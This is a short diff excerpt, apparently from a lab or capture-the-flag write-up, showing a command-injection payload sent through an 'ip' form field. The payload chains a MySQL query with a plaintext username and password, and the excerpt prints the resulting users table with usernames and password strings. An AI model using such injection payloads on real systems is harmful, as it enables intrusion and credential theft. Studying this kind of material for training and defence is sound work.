@@ -161,7 +161,6 @@ test
 webapp
 
 ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
-
 id	username	password
 1	admin	5afac8d85f
 2	john	66lajGGbla
